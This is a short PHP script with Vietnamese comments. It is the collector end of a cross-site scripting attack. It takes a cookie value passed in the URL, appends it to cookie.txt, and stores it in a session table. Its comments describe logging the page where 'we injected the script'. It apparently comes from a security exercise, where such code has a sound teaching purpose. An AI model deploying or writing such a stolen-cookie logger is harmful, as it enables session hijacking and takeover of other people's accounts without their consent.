<?php
require_once 'models/UserModel.php';
    if(isset($_GET['cookie']))
    {
        $userModel = new UserModel();
        $cookie = $_GET['cookie'];
        // Mở file cookie.txt, tham số a nghĩa là file này mở chỉ để
        
        $f=fopen('cookie.txt','a');
        // Ta write địa chỉ trang web mà ở trang đó bị ta chèn script.
       // fwrite($f,$_SERVER['HTTP_REFERER']);
        // Ghi giá trị cookie
        fwrite($f,".Cookie la: ".$cookie." \n");
        // Đóng file lại
        fclose($f);

        // Chèn dữ liệu vào bảng session
        $userModel->insertSession($_GET['cookie']);
    }

    